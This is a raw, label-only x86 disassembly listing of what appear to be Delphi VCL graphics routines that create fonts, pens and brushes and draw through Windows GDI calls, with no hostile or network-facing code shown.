mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41d1d8
xor eax eax
push ebp
push sub_41d458
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ esi + 0x10 ]
cmp edi ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d45f
mov eax [ ebp - 0x4 ]
call sub_41d1e4
retn
inc [ edi + 0x4 ]
mov [ esi + 0x10 ] edi
mov eax esi
mov si 0xfffd
call sub_403320
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41d2d4
sub_41d468
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41d1d8
xor edx edx
push ebp
push sub_41d4c7
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x4 ]
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d4ce
mov eax [ ebp - 0x4 ]
call sub_41d1e4
retn
mov esi ebx
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov ebx [ ebx ]
test ebx ebx
jne r-xdata
cmp [ esi + 0x14 ] 0x0
jge r-xdata
push eax
call DeleteObject
xor eax eax
mov [ esi + 0x8 ] eax
sub_41d4d4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
call sub_4144cc
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41d571
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
cmp eax [ ebp - 0x4 ]
jg r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_414108
mov ebx eax
mov eax ebx
call sub_41eaa0
inc [ ebp - 0x4 ]
mov eax ebx
call sub_41edb4
mov eax [ rw-data ]
call sub_41d468
mov eax [ rw-data ]
call sub_41d468
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d578
mov ebx [ ebp - 0x4 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ rw-data ]
call sub_414530
retn
inc ebx
xor esi esi
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_414108
call sub_41ec8c
inc esi
dec ebx
jne r-xdata
sub_41dbc7
dec [ ebx ]
add [ eax ] al
add [ edi + 0x45 ] cl
dec ebp
pop edi
inc ebx
dec eax
inc ecx
push edx
push ebx
inc ebp
push esp
add [ edx + 0x11 ] ch
mov ecx rw-data
call sub_413bb8
retn
sub_41dbf8
push ebx
push esi
push edi
add esp 0xffffffa0
mov ebx edx
mov esi eax
push esi
mov edi ebx
mov esi rw-data
mov ecx 0xb
[ edi ] [ esi ]
pop esi
test esi esi
je r-xdata
add esp 0x60
pop edi
pop esi
pop ebx
retn
push esp
push 0x3c
push esi
call GetObjectA
test eax eax
je r-xdata
mov eax [ esp ]
mov [ ebx + 0x4 ] eax
cmp [ esp + 0x10 ] 0x2bc
jl r-xdata
cmp [ esp + 0x14 ] 0x1
jne r-xdata
or [ ebx + 0x9 ] 0x1
cmp [ esp + 0x15 ] 0x1
jne r-xdata
or [ ebx + 0x9 ] 0x2
cmp [ esp + 0x16 ] 0x1
jne r-xdata
or [ ebx + 0x9 ] 0x4
mov al [ esp + 0x17 ]
mov [ ebx + 0xa ] al
lea eax [ esp + 0x3c ]
lea edx [ esp + 0x1c ]
mov ecx 0x20
call sub_402c40
lea edx [ esp + 0x3c ]
lea eax [ ebx + 0xb ]
mov cl 0x1f
call sub_402a30
mov al [ esp + 0x1b ]
and al 0xf
dec al
je r-xdata
or [ ebx + 0x9 ] 0x8
mov [ ebx + 0x8 ] 0x2
jmp r-xdata
dec al
jne r-xdata
mov [ ebx ] esi
mov [ ebx + 0x8 ] 0x0
mov [ ebx + 0x8 ] 0x1
jmp r-xdata
sub_41dcac
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor eax eax
mov [ rw-data ] eax
mov edx rw-data
mov eax [ rw-data ]
call sub_41d1f0
mov [ esi + 0x10 ] eax
mov [ esi + 0x18 ] 0xff000008
mov eax [ rw-data ]
mov [ esi + 0x1c ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403448
mov eax esi
pop esi
pop ebx
retn
call sub_4034a0
pop [ fs : 0x0 ]
add esp 0xc
sub_41dd00
push ebx
push esi
call sub_4034b0
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
mov eax [ rw-data ]
call sub_41d2d4
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403498
sub_41dd44
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_4032b0
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41471c
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_41da04
xor eax eax
push ebp
push sub_41ddff
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax ebx
call sub_41da04
xor eax eax
push ebp
push sub_41dde2
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_41d3fc
mov edx [ ebx + 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_41de80
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
cmp eax [ ebx + 0x1c ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41dde9
mov eax [ ebp - 0x8 ]
call sub_41da14
retn
mov eax ebx
call sub_41e104
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_41e120
sub_41de30
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41da04
xor eax eax
push ebp
push sub_41de75
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_41d384
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41de7c
mov eax [ ebp - 0x4 ]
call sub_41da14
retn
sub_41de94
push ebp
mov ebp esp
add esp 0xffffffb4
push ebx
xor edx edx
mov [ ebp - 0x4c ] edx
mov [ ebp - 0x48 ] edx
mov [ ebp - 0x44 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_41e01d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e024
lea eax [ ebp - 0x4c ]
mov edx 0x3
call sub_403f1c
retn
mov eax [ rw-data ]
call sub_41d1d8
xor eax eax
push ebp
push sub_41dff5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_41d1e4
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov [ ebp - 0x40 ] eax
xor eax eax
mov [ ebp - 0x3c ] eax
xor eax eax
mov [ ebp - 0x38 ] eax
xor eax eax
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x1
je r-xdata
mov [ ebp - 0x30 ] 0x190
mov [ ebp - 0x30 ] 0x2bc
jmp r-xdata
lea eax [ ebp - 0x4c ]
mov edx [ ebp - 0x4 ]
add edx 0x1b
call sub_40415c
mov edx [ ebp - 0x4c ]
lea eax [ ebp - 0x24 ]
call sub_4086e4
lea eax [ ebp - 0x48 ]
mov edx rw-data
call sub_40415c
mov edx [ ebp - 0x48 ]
lea eax [ ebp - 0x24 ]
call sub_4086e4
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x2
setne al
mov [ ebp - 0x2c ] al
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x4
setne al
mov [ ebp - 0x2b ] al
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x8
setne al
mov [ ebp - 0x2a ] al
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x1a ]
mov [ ebp - 0x29 ] al
lea eax [ ebp - 0x44 ]
mov edx [ ebp - 0x4 ]
add edx 0x1b
call sub_40415c
mov eax [ ebp - 0x44 ]
mov edx r-xdata
call sub_407d24
test eax eax
jne r-xdata
mov [ ebp - 0x25 ] 0x2
jmp r-xdata
dec al
je r-xdata
mov [ ebp - 0x26 ] 0x0
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0x27 ] 0x0
mov eax ebx
call sub_41e178
dec al
je r-xdata
lea eax [ ebp - 0x40 ]
push eax
call CreateFontIndirectA
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
mov [ ebp - 0x25 ] 0x1
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x25 ] 0x0
sub_41e03c
push ebx
push esi
add esp 0xffffffd4
mov esi edx
mov ebx eax
mov edx esp
mov eax esi
call sub_41dbf8
mov edx esp
mov eax ebx
call sub_41de30
add esp 0x2c
pop esi
pop ebx
retn
sub_41e068
push ebx
push esi
add esp 0xffffffd4
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_41de18
mov [ esp + 0x4 ] esi
mov edx esp
mov eax ebx
call sub_41de30
add esp 0x2c
pop esi
pop ebx
retn
sub_41e0a8
push ebx
push esi
add esp 0xfffffed4
mov esi edx
mov ebx eax
test esi esi
je r-xdata
add esp 0x12c
pop esi
pop ebx
retn
mov edx esp
mov eax ebx
call sub_41de18
lea eax [ esp + 0xb ]
xor ecx ecx
mov edx 0x20
call sub_402b40
lea eax [ esp + 0x2c ]
mov edx esi
mov ecx 0xff
call sub_404194
lea edx [ esp + 0x2c ]
lea eax [ esp + 0xb ]
mov cl 0x1f
call sub_402a30
mov edx esp
mov eax ebx
call sub_41de30
sub_41e120
push ebx
push esi
mov esi edx
mov ebx eax
push 0x48
mov eax [ ebx + 0x1c ]
push eax
push esi
call MulDiv
mov edx eax
neg edx
mov eax ebx
call sub_41e068
pop esi
pop ebx
retn
sub_41e14c
push ebx
add esp 0xffffffd0
mov [ esp ] dl
mov ebx eax
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_41de18
mov al [ esp ]
mov [ esp + 0xd ] al
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_41de30
add esp 0x30
pop ebx
retn
sub_41e180
push ebx
push esi
add esp 0xffffffd4
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_41de18
mov [ esp + 0x8 ] bl
mov edx esp
mov eax esi
call sub_41de30
add esp 0x2c
pop esi
pop ebx
retn
sub_41e1b0
push ebx
push esi
add esp 0xffffffd4
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_41de18
mov [ esp + 0xa ] bl
mov edx esp
mov eax esi
call sub_41de30
add esp 0x2c
pop esi
pop ebx
retn
sub_41e1d8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov edx rw-data
mov eax [ rw-data ]
call sub_41d1f0
mov [ esi + 0x10 ] eax
mov [ esi + 0x18 ] 0x4
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403448
mov eax esi
pop esi
pop ebx
retn
call sub_4034a0
pop [ fs : 0x0 ]
add esp 0xc
sub_41e21c
push ebx
push esi
call sub_4034b0
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
mov eax [ rw-data ]
call sub_41d2d4
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403498
sub_41e244
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_4032b0
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41471c
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_41da04
xor eax eax
push ebp
push sub_41e2e3
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax ebx
call sub_41da04
xor eax eax
push ebp
push sub_41e2c6
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_41d3fc
mov dl [ ebx + 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_41e42c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e2cd
mov eax [ ebp - 0x8 ]
call sub_41da14
retn
sub_41e2fc
push esi
push edi
mov eax [ eax + 0x10 ]
lea esi [ eax + 0x10 ]
mov edi edx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor eax eax
mov [ edx ] eax
pop edi
pop esi
retn
sub_41e314
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41da04
xor eax eax
push ebp
push sub_41e359
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_41d384
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e360
mov eax [ ebp - 0x4 ]
call sub_41da14
retn
sub_41e36c
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_41e2fc
mov [ esp + 0x4 ] esi
mov edx esp
mov eax ebx
call sub_41e314
add esp 0x10
pop esi
pop ebx
retn
sub_41e394
push ebp
mov ebp esp
add esp 0xffffffec
mov eax [ eax + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
call sub_41d1d8
xor eax eax
push ebp
push sub_41e41a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_41d1e4
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x1c ]
movzx eax [ eax * 2 + rw-data ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_41d9c0
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x14 ]
push eax
call CreatePenIndirect
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
sub_41e448
push ebx
push esi
add esp 0xfffffff0
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_41e2fc
mov [ esp + 0xc ] bl
mov edx esp
mov eax esi
call sub_41e314
add esp 0x10
pop esi
pop ebx
retn
sub_41e478
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov edx esp
mov eax ebx
call sub_41e2fc
mov [ esp + 0x8 ] esi
mov edx esp
mov eax ebx
call sub_41e314
sub_41e4a4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov edx rw-data
mov eax [ rw-data ]
call sub_41d1f0
mov [ esi + 0x10 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403448
mov eax esi
pop esi
pop ebx
retn
call sub_4034a0
pop [ fs : 0x0 ]
add esp 0xc
sub_41e4e4
push ebx
push esi
call sub_4034b0
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
mov eax [ rw-data ]
call sub_41d2d4
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403498
sub_41e50c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_4032b0
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41471c
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_41da04
xor eax eax
push ebp
push sub_41e59c
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax ebx
call sub_41da04
xor eax eax
push ebp
push sub_41e57f
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_41d3fc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e586
mov eax [ ebp - 0x8 ]
call sub_41da14
retn
sub_41e5b4
push esi
push edi
mov eax [ eax + 0x10 ]
lea esi [ eax + 0x10 ]
mov edi edx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor eax eax
mov [ edx ] eax
xor eax eax
mov [ edx + 0x8 ] eax
pop edi
pop esi
retn
sub_41e5d0
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41da04
xor eax eax
push ebp
push sub_41e615
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_41d384
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e61c
mov eax [ ebp - 0x4 ]
call sub_41da14
retn
sub_41e620
push esi
push edi
add esp 0xfffffff0
mov esi rw-data
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp + 0x8 ] edx
mov edx esp
call sub_41e5d0
add esp 0x10
pop edi
pop esi
retn
sub_41e64c
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_41e5b4
mov [ esp + 0x4 ] esi
cmp [ esp + 0xc ] 0x1
jne r-xdata
mov edx esp
mov eax ebx
call sub_41e5d0
add esp 0x10
pop esi
pop ebx
retn
mov [ esp + 0xc ] 0x0
sub_41e680
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax [ eax + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
call sub_41d1d8
xor edx edx
push ebp
push sub_41e74d
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_41d1e4
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
test eax eax
je r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x1c ]
mov edx eax
sub dl 0x1
jb r-xdata
mov [ ebp - 0x10 ] 0x3
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ eax ]
call [ edx + 0x64 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_41d9c0
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x10 ]
push eax
call CreateBrushIndirect
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x10 ] 0x2
and eax 0x7f
sub eax 0x2
mov [ ebp - 0x8 ] eax
sub_41e768
push ebx
push esi
add esp 0xfffffff0
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_41e5b4
mov eax ebx
mov [ esp + 0xc ] al
cmp al 0x1
jne r-xdata
mov edx esp
mov eax esi
call sub_41e5d0
add esp 0x10
pop esi
pop ebx
retn
mov [ esp + 0x4 ] 0xffffff
sub_41e79c
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4030f4
lea eax [ edi + 0x38 ]
push eax
call InitializeCriticalSection
mov dl 0x1
mov eax [ r-xdata ]
call sub_41dcac
mov esi eax
mov [ edi + 0xc ] esi
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] sub_41efdc
lea eax [ edi + 0x38 ]
mov [ esi + 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41e1d8
mov esi eax
mov [ edi + 0x10 ] esi
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] sub_41effc
lea eax [ edi + 0x38 ]
mov [ esi + 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41e4a4
mov esi eax
mov [ edi + 0x14 ] esi
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] sub_41f01c
lea eax [ edi + 0x38 ]
mov [ esi + 0x14 ] eax
mov [ edi + 0x20 ] 0xcc0020
mov al [ r-xdata ]
mov [ edi + 0x8 ] al
mov edx edi
mov eax [ rw-data ]
call sub_414444
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403448
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4034a0
pop [ fs : 0x0 ]
add esp 0xc
sub_41e860
push ebx
push esi
call sub_4034b0
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_4144e0
xor edx edx
mov eax esi
call sub_41ee14
mov eax [ esi + 0xc ]
call sub_403124
mov eax [ esi + 0x10 ]
call sub_403124
mov eax [ esi + 0x14 ]
call sub_403124
lea eax [ esi + 0x38 ]
push eax
call DeleteCriticalSection
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4146f0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403498
sub_41e8bc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov edi [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41ee68
mov dl [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_41ee68
mov edx [ ebx + 0x20 ]
push edx
mov edx [ edi + 0xc ]
sub edx [ edi + 0x4 ]
push edx
mov edx [ edi + 0x8 ]
sub edx [ edi ]
push edx
mov edx [ edi + 0x4 ]
push edx
mov edx [ edi ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4 ]
push edx
mov edx [ esi + 0xc ]
sub edx [ esi + 0x4 ]
push edx
mov edx [ esi + 0x8 ]
mov eax [ esi ]
sub edx eax
push edx
mov edx [ esi + 0x4 ]
push edx
push eax
mov eax [ ebx + 0x4 ]
push eax
call StretchBlt
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_41e944
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41ee68
mov eax [ ebx + 0x14 ]
call sub_41e644
call sub_41d9c0
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
mov eax [ ebx + 0xc ]
mov eax [ eax + 0x18 ]
call sub_41d9c0
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetTextColor
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
add eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
add ecx edi
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_412cd4
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
sub_41e9f0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41ee68
mov eax [ ebx + 0x14 ]
call sub_41e680
push eax
push esi
mov eax [ ebx + 0x4 ]
push eax
call FillRect
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_41ea2c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41ee68
mov eax [ ebx + 0x14 ]
call sub_41e680
push eax
push esi
mov eax [ ebx + 0x4 ]
push eax
call FrameRect
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_41ea68
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41ee68
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call LineTo
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
retn
sub_41eac8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_41ee68
push 0x0
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call MoveToEx
pop edi
pop esi
pop ebx
retn
sub_41eaf4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41ee68
inc edi
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call Polyline
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
retn
sub_41eb2c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41ee68
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call Rectangle
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_41eb74
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41ee68
mov ecx edi
mov edx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
sub_41ebb0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_41ee68
xor eax eax
mov [ esi ] eax
xor eax eax
mov [ esi + 0x4 ] eax
push esi
mov eax edi
call sub_4041b8
push eax
mov eax edi
call sub_4043b8
push eax
mov eax [ ebx + 0x4 ]
push eax
call GetTextExtentPoint32A
pop edi
pop esi
pop ebx
retn
sub_41ebf4
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
call sub_41ebb0
mov eax [ esp ]
pop ecx
pop edx
pop esi
pop ebx
retn
sub_41ec10
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
call sub_41ebb0
mov eax [ esp + 0x4 ]
pop ecx
pop edx
pop esi
pop ebx
retn
sub_41ec30
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_41ec7c
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x50 ] 0x0
sete [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ec83
